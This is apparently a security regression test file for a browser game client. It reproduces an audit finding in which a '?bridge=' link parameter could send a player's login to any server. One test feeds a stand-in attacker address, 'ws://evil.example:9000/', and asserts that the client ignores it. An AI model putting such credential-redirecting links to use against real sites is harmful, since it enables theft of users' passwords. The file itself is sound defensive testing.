// Reproduction for docs/audits/2026-10-16-bridge-web.md, F1: a ?bridge= link sends
// the login (name and password) to any server. Not part of the normal suite:
//   node --test tests/audit/sweep-bridge-web.test.mjs
import assert from 'node:assert/strict';
import test from 'node:test';

/** client/src/config.js as a page at http://game.example:8080/play.html<search> would load it. */
async function configFor(search, siteConfig = undefined) {
  globalThis.location = { search, protocol: 'http:', hostname: 'game.example' };
  globalThis.window = siteConfig ? { BOXHEAD_CONFIG: siteConfig } : {};
  return import(`../../client/src/config.js?case=${Math.random()}`);
}

test('attack: a link with ?bridge= points the login at another server', async () => {
  const config = await configFor('?bridge=ws://evil.example:9000/');
  assert.equal(config.BRIDGE_URL, 'ws://game.example:8081/', 'the page must only log in to its own server');
});

test("guard: the host's config.js still chooses the bridge", async () => {
  const config = await configFor('', { bridgeUrl: 'wss://play.example/ws/' });
  assert.equal(config.BRIDGE_URL, 'wss://play.example/ws/');
});

test('guard: without overrides the bridge is next to the page', async () => {
  const config = await configFor('');
  assert.equal(config.BRIDGE_URL, 'ws://game.example:8081/');
});
